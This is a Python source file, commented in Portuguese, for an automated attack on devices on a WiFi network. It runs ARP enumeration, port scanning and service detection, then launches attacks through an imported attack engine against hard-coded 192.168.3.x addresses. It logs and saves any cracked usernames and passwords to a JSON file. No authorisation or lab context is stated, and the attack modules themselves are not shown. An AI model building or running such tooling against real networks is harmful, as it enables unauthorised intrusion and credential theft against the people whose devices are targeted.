#!/usr/bin/env python3
"""
Sistema Principal de Ataque à Rede WiFi
Orquestra enumeração, escaneamento e ataques
"""

import sys
import logging
import json
from typing import List, Dict
from datetime import datetime
from dataclasses import dataclass, asdict
from enum import Enum

from enumeration import NetworkEnumerator, NetworkDevice
from port_scanner import PortScanner, ScanResult
from service_detector import ServiceDetector, ServiceInfo
from attacks import AttackEngine, AttackResult, AttackStatus

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(message)s',
    handlers=[
        logging.FileHandler('ataque_rede.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)


class AttackPhase(Enum):
    """Fases do ataque"""
    ENUMERATION = "enumeration"
    PORT_SCAN = "port_scan"
    SERVICE_DETECTION = "service_detection"
    ATTACK = "attack"
    COMPLETED = "completed"


@dataclass
class TargetInfo:
    """Informações completas sobre um alvo"""
    device: NetworkDevice
    scan_result: ScanResult = None
    services: Dict[int, ServiceInfo] = None
    attack_results: List[AttackResult] = None
    phase: AttackPhase = AttackPhase.ENUMERATION
    completed: bool = False
    errors: List[str] = None
    
    def __post_init__(self):
        if self.services is None:
            self.services = {}
        if self.attack_results is None:
            self.attack_results = []
        if self.errors is None:
            self.errors = []


class NetworkAttackOrchestrator:
    """Orquestrador principal do sistema de ataque"""
    
    def __init__(self, target_ips: List[str], wordlist_path: str = None):
        """
        Inicializa o orquestrador
        
        Args:
            target_ips: Lista de IPs alvo
            wordlist_path: Caminho para wordlist (opcional)
        """
        self.target_ips = target_ips
        self.wordlist_path = wordlist_path
        
        self.enumerator = NetworkEnumerator(target_ips)
        self.port_scanner = PortScanner(timeout=1.0, max_workers=50)
        self.service_detector = ServiceDetector()
        self.attack_engine = AttackEngine(wordlist_path=wordlist_path)
        
        self.targets: Dict[str, TargetInfo] = {}
        self.all_devices: List[NetworkDevice] = []
        self.results_file = f"ataque_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    def run(self):
        """Executa o processo completo de ataque"""
        logger.info("=" * 70)
        logger.info("SISTEMA DE ATAQUE À REDE WiFi")
        logger.info("=" * 70)
        logger.info(f"Alvos: {', '.join(self.target_ips)}")
        logger.info("")
        
        try:
            # Fase 1: Enumeração
            if not self._enumerate_network():
                logger.error("Falha na enumeração. Abortando.")
                return False
            
            # Fase 2: Processa cada alvo sequencialmente
            for target_ip in self.target_ips:
                if target_ip in self.targets:
                    logger.info("")
                    logger.info("=" * 70)
                    logger.info(f"PROCESSANDO ALVO: {target_ip}")
                    logger.info("=" * 70)
                    self._process_target(target_ip)
                else:
                    logger.warning(f"Alvo {target_ip} não encontrado na enumeração")
            
            # Fase 3: Relatório final
            self._generate_report()
            
            logger.info("")
            logger.info("=" * 70)
            logger.info("ATAQUE CONCLUÍDO")
            logger.info("=" * 70)
            
            return True
            
        except KeyboardInterrupt:
            logger.warning("\nInterrompido pelo usuário")
            self._save_progress()
            return False
        except Exception as e:
            logger.error(f"Erro fatal: {e}", exc_info=True)
            self._save_progress()
            return False
    
    def _enumerate_network(self) -> bool:
        """Fase 1: Enumera a rede"""
        logger.info("FASE 1: ENUMERAÇÃO DE REDE")
        logger.info("-" * 70)
        
        try:
            if not self.enumerator.run_arp_scan():
                return False
            
            self.all_devices = self.enumerator.get_all_devices()
            
            # Inicializa informações dos alvos
            for target_ip in self.target_ips:
                device = self.enumerator.get_device_by_ip(target_ip)
                if device:
                    self.targets[target_ip] = TargetInfo(device=device)
                    logger.info(f"✓ Alvo {target_ip} encontrado na rede")
                else:
                    logger.warning(f"✗ Alvo {target_ip} não encontrado na rede")
                    # Cria entrada mesmo assim para tentar atacar
                    from enumeration import NetworkDevice
                    fake_device = NetworkDevice(ip=target_ip, mac="Unknown", is_target=True)
                    self.targets[target_ip] = TargetInfo(device=fake_device)
            
            logger.info(f"\nTotal de dispositivos encontrados: {len(self.all_devices)}")
            return True
            
        except Exception as e:
            logger.error(f"Erro na enumeração: {e}")
            return False
    
    def _process_target(self, target_ip: str):
        """Processa um alvo completo (scan + detecção + ataques)"""
        target = self.targets[target_ip]
        
        try:
            # Fase 2: Escaneamento de portas
            target.phase = AttackPhase.PORT_SCAN
            logger.info(f"\nFASE 2: ESCANEAMENTO DE PORTAS - {target_ip}")
            logger.info("-" * 70)
            
            scan_result = self.port_scanner.scan_host(target_ip)
            target.scan_result = scan_result
            
            if not scan_result.success:
                logger.error(f"Falha no escaneamento de {target_ip}: {scan_result.error}")
                target.errors.append(f"Scan failed: {scan_result.error}")
                target.completed = True
                return
            
            if len(scan_result.open_ports) == 0:
                logger.warning(f"Nenhuma porta aberta encontrada em {target_ip}")
                target.completed = True
                return
            
            # Verifica falso positivo
            if self.port_scanner.detect_false_positive(scan_result):
                logger.warning(f"Possível falso positivo detectado em {target_ip}")
                target.errors.append("Possible false positive detected")
            
            # Fase 3: Detecção de serviços
            target.phase = AttackPhase.SERVICE_DETECTION
            logger.info(f"\nFASE 3: DETECÇÃO DE SERVIÇOS - {target_ip}")
            logger.info("-" * 70)
            
            services = self.service_detector.detect_services(scan_result)
            target.services = services
            
            if not services:
                logger.warning(f"Nenhum serviço identificado em {target_ip}")
                target.completed = True
                return
            
            # Fase 4: Ataques
            target.phase = AttackPhase.ATTACK
            logger.info(f"\nFASE 4: EXECUTANDO ATAQUES - {target_ip}")
            logger.info("-" * 70)
            
            # Ordena serviços por prioridade
            sorted_services = sorted(
                services.items(),
                key=lambda x: self.service_detector.get_attack_priority(x[1])
            )
            
            for port, service_info in sorted_services:
                if service_info.attack_type:
                    logger.info(f"\nAtacando porta {port} ({service_info.name})...")
                    attack_result = self.attack_engine.execute_attack(
                        target_ip=target_ip,
                        port=port,
                        service=service_info.name,
                        attack_type=service_info.attack_type
                    )
                    
                    target.attack_results.append(attack_result)
                    
                    if attack_result.success:
                        logger.info(f"✓ Ataque bem-sucedido em {target_ip}:{port}")
                        if attack_result.credentials:
                            logger.info(f"  Credenciais: {attack_result.credentials}")
                    else:
                        if attack_result.status != AttackStatus.SKIPPED:
                            logger.warning(f"✗ Ataque falhou: {attack_result.error}")
            
            target.phase = AttackPhase.COMPLETED
            target.completed = True
            
            logger.info(f"\n✓ Processamento de {target_ip} concluído")
            
        except Exception as e:
            logger.error(f"Erro ao processar {target_ip}: {e}", exc_info=True)
            target.errors.append(str(e))
            target.completed = True
    
    def _generate_report(self):
        """Gera relatório final"""
        logger.info("")
        logger.info("=" * 70)
        logger.info("RELATÓRIO FINAL")
        logger.info("=" * 70)
        
        successful_attacks = 0
        total_attacks = 0
        credentials_found = []
        
        for target_ip, target in self.targets.items():
            logger.info(f"\nAlvo: {target_ip}")
            logger.info(f"  Status: {'Concluído' if target.completed else 'Incompleto'}")
            
            if target.scan_result:
                logger.info(f"  Portas abertas: {len(target.scan_result.open_ports)}")
            
            if target.services:
                logger.info(f"  Serviços identificados: {len(target.services)}")
            
            if target.attack_results:
                logger.info(f"  Ataques executados: {len(target.attack_results)}")
                for attack in target.attack_results:
                    total_attacks += 1
                    if attack.success:
                        successful_attacks += 1
                        if attack.credentials:
                            credentials_found.append({
                                'target': target_ip,
                                'port': attack.port,
                                'service': attack.service,
                                'credentials': attack.credentials
                            })
                            logger.info(f"    ✓ {attack.service} - Credenciais encontradas!")
            
            if target.errors:
                logger.warning(f"  Erros: {len(target.errors)}")
                for error in target.errors:
                    logger.warning(f"    - {error}")
        
        logger.info("")
        logger.info(f"Total de ataques: {total_attacks}")
        logger.info(f"Ataques bem-sucedidos: {successful_attacks}")
        logger.info(f"Credenciais encontradas: {len(credentials_found)}")
        
        if credentials_found:
            logger.info("")
            logger.info("CREDENCIAIS ENCONTRADAS:")
            for cred in credentials_found:
                logger.info(f"  {cred['target']}:{cred['port']} ({cred['service']})")
                logger.info(f"    Usuário: {cred['credentials'].get('username', 'N/A')}")
                logger.info(f"    Senha: {cred['credentials'].get('password', 'N/A')}")
        
        # Salva resultados em JSON
        self._save_results()
    
    def _save_results(self):
        """Salva resultados em arquivo JSON"""
        try:
            results = {
                'timestamp': datetime.now().isoformat(),
                'targets': {}
            }
            
            for target_ip, target in self.targets.items():
                target_dict = {
                    'ip': target.device.ip,
                    'mac': target.device.mac,
                    'vendor': target.device.vendor,
                    'completed': target.completed,
                    'phase': target.phase.value,
                    'errors': target.errors,
                    'scan_result': None,
                    'services': {},
                    'attack_results': []
                }
                
                if target.scan_result:
                    target_dict['scan_result'] = {
                        'ip': target.scan_result.ip,
                        'open_ports': [
                            {
                                'port': p.port,
                                'service': p.service,
                                'banner': p.banner
                            }
                            for p in target.scan_result.open_ports
                        ],
                        'scan_time': target.scan_result.scan_time,
                        'success': target.scan_result.success
                    }
                
                if target.services:
                    target_dict['services'] = {
                        str(port): {
                            'name': svc.name,
                            'version': svc.version,
                            'attack_type': svc.attack_type
                        }
                        for port, svc in target.services.items()
                    }
                
                if target.attack_results:
                    target_dict['attack_results'] = [
                        {
                            'port': ar.port,
                            'service': ar.service,
                            'attack_type': ar.attack_type,
                            'status': ar.status.value,
                            'success': ar.success,
                            'credentials': ar.credentials,
                            'data': ar.data,
                            'error': ar.error,
                            'duration': ar.duration
                        }
                        for ar in target.attack_results
                    ]
                
                results['targets'][target_ip] = target_dict
            
            with open(self.results_file, 'w') as f:
                json.dump(results, f, indent=2)
            
            logger.info(f"\nResultados salvos em: {self.results_file}")
            
        except Exception as e:
            logger.error(f"Erro ao salvar resultados: {e}")
    
    def _save_progress(self):
        """Salva progresso atual"""
        logger.info("Salvando progresso...")
        self._save_results()


def main():
    """Função principal"""
    # IPs alvo
    target_ips = ["192.168.3.13", "192.168.3.1", "192.168.3.14"]
    
    # Caminho para wordlist (opcional)
    wordlist_path = None  # Pode ser configurado aqui
    
    # Cria e executa o orquestrador
    orchestrator = NetworkAttackOrchestrator(
        target_ips=target_ips,
        wordlist_path=wordlist_path
    )
    
    success = orchestrator.run()
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()


